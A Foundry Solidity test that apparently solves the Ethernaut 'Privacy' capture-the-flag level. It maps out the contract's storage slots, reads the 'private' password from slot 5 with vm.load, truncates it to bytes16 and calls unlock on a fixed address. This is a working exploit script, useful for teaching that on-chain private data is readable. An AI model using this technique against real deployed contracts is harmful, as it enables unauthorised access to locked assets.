// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Privacy.sol";

contract PrivacyTest is Test {
    address instance = 0x08eA32D71361D376be0335283655605C76977399;

    function test() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // reading the storage variable at index 5,
        // bool public locked = true; 1/32 slot 0
        // uint256 public ID = block.timestamp; 32/32 slot 1
        // uint8 private flattening = 10; 1/32 slot 2
        // uint8 private denomination = 255; 2/32 slot 2
        // uint16 private awkwardness = uint16(block.timestamp); 4/32 slot 2
        // bytes32[3] private data; 32/32 * 3 slots 3, 4 and 5
        // The indexes are contiguous, since the data array is not dynamic. 
        bytes32 password = vm.load(instance, bytes32(uint256(5)));
        bytes16 key = bytes16(password);
        console.logBytes32(password);
        console.logBytes16(key);
        Privacy(instance).unlock(key);
        assert(Privacy(instance).locked() == false);
        vm.stopBroadcast();
    }
}
